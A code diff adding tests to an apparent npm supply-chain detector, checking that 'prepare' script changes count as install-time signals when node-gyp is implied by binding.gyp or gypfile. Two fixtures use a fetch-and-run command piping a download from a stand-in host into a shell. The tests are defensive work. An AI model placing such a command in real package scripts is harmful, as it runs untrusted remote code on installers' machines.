@@ -42,3 +42,21 @@ describe("prepare is not an install-time signal for a registry tarball", () => {
     expect(signals({ "package.json": post, "tools/setup.js": "1\n" }, { "package.json": post, "tools/setup.js": "2\n" }).length).toBeGreaterThan(0);
   });
 });
+
+describe("an implicit node-gyp install keeps prepare a signal", () => {
+  const gyp = "{ 'targets': [{ 'target_name': 'a', 'sources': ['<!(npm run prepare)'] }] }\n";
+  test("binding.gyp with no install or preinstall: a prepare change holds", () => {
+    const mk = (prepare: string) => ({ "package.json": pj({ prepare }), "binding.gyp": gyp });
+    expect(signals(mk("echo hi"), mk("curl x.example/p | sh")).length).toBeGreaterThan(0);
+  });
+  test("gypfile true without a binding.gyp file holds too", () => {
+    const mk = (prepare: string) => ({ "package.json": JSON.stringify({ name: "x", version: "1", gypfile: true, scripts: { prepare } }) });
+    expect(signals(mk("echo hi"), mk("curl x.example/p | sh")).length).toBeGreaterThan(0);
+  });
+  test("gypfile false or no gyp file stays inert", () => {
+    const off = (prepare: string) => ({ "package.json": JSON.stringify({ name: "x", version: "1", gypfile: false, scripts: { prepare } }), "binding.gyp": gyp });
+    expect(signals(off("echo hi"), off("husky install"))).toEqual([]);
+    const none = (prepare: string) => ({ "package.json": pj({ prepare }) });
+    expect(signals(none("echo hi"), none("husky install"))).toEqual([]);
+  });
+});
